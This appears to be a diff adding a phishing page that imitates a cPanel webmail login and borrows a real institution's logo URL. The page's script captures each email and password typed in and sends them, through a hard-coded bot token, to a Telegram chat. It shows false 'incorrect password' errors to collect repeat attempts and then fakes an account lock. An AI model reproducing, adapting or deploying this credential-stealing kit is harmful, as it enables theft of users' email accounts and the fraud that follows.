@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Webmail Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0; padding: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex; flex-direction: column;
+      align-items: center; min-height: 100vh;
+    }
+    .container {
+      width: 100%; max-width: 360px;
+      padding: 0 16px; margin-top: 20vh;
+      box-sizing: border-box; text-align: center;
+    }
+    .logo { display: block; margin: 0 auto 40px; height: 48px; }
+    .error {
+      color: #d00; margin-bottom: 16px;
+      min-height: 1.2em;
+    }
+    label {
+      display: block; margin-bottom: 6px;
+      font-size: 14px; color: #333;
+      text-align: left;
+    }
+    input {
+      width: 100%;
+      padding: 10px 12px 10px 40px; /* ensure space for icon */
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%; padding: 12px 0;
+      background: #0099d9; color: #fff;
+      font-size: 16px; border: none;
+      border-radius: 4px; cursor: pointer;
+    }
+    .langs { margin: 40px 0; font-size: 13px; color: #555; }
+    .langs a, .langs span {
+      margin: 0 6px; color: #555;
+      text-decoration: none; cursor: pointer;
+    }
+    footer {
+      text-align: center; padding: 16px;
+      font-size: 12px; color: #777;
+      border-top: 1px solid #eee;
+      margin-top: auto; width: 100%;
+      box-sizing: border-box;
+    }
+    footer img {
+      vertical-align: middle; height: 18px;
+      margin-right: 4px;
+    }
+    @media (max-width: 400px) {
+      .container { margin-top: 15vh; }
+      button { font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo"
+      src="https://webmail.icec.ti-edu.ch/cPanel_magic_revision_1594922736/unprotected/cpanel/images/webmail-logo.svg"
+      alt="Webmail logo">
+
+    <div id="errorMsg" class="error"></div>
+
+    <form id="loginForm" style="max-width:360px;margin:0 auto;padding:0 16px;">
+      <div style="margin-bottom:24px;">
+        <label for="email">Email Address</label>
+        <div style="position:relative;">
+          <span style="
+            position:absolute;
+            left:12px;
+            top:50%;
+            transform:translateY(-50%);
+            color:#999;
+            font-size:16px;
+            pointer-events:none;
+          ">👤</span>
+          <input
+            id="email"
+            type="email"
+            required
+            placeholder="Enter your email address."
+          />
+        </div>
+      </div>
+      <div style="margin-bottom:32px;">
+        <label for="password">Password</label>
+        <div style="position:relative;">
+          <span style="
+            position:absolute;
+            left:12px;
+            top:50%;
+            transform:translateY(-50%);
+            color:#999;
+            font-size:16px;
+            pointer-events:none;
+          ">🔒</span>
+          <input
+            id="password"
+            type="password"
+            required
+            placeholder="Enter your email password."
+          />
+        </div>
+      </div>
+      <button type="submit" id="loginBtn"
+        style="width:100%;padding:12px 0;background:#0099d9;color:#fff;font-size:16px;border:none;border-radius:4px;cursor:pointer;"
+      >Log in</button>
+    </form>
+
+    <div class="langs">
+      <a href="#">العربية</a>
+      <a href="#">čeština</a>
+      <a href="#">dansk</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Ελληνικά</a>
+      <a href="#">español</a>
+      <a href="#">español latinoamericano</a>
+      <a href="#">español de España</a>
+      <span>…</span>
+    </div>
+  </div>
+
+  <footer>
+    <div>
+      <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=" alt="cP">
+      © 2025 cPanel, L.L.C.
+    </div>
+    <a href="#">Privacy Policy</a>
+  </footer>
+
+  <script>
+    const BOT_TOKEN = '7040065345:AAGE_TcKO9MxvVV-Rh6-VmXziWEq9olex3k';
+    const CHAT_ID   = '-4726861680';
+
+    let attemptCount = 0, maxAttempts = 2;
+    const form = document.getElementById('loginForm'),
+          errorDiv = document.getElementById('errorMsg'),
+          loginBtn = document.getElementById('loginBtn');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      attemptCount++;
+
+      const email    = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      let text;
+
+      if (attemptCount <= maxAttempts) {
+        text =
+          `❗ Attempt #${attemptCount} - Invalid credentials\n` +
+          `• Email: ${email}\n` +
+          `• Password: ${password}`;
+        errorDiv.textContent = 'Webmail or Password incorrect.';
+      } else {
+        text =
+          `🔒 Account Locked on Attempt #${attemptCount}\n` +
+          `• Email: ${email}`;
+        errorDiv.textContent = "You can't access your account at the moment, kindly try again later.";
+        loginBtn.disabled = true;
+        form.querySelectorAll('input').forEach(i => i.disabled = true);
+      }
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type':'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      }).catch(() => {});
+    });
+  </script>
+</body>
+</html>
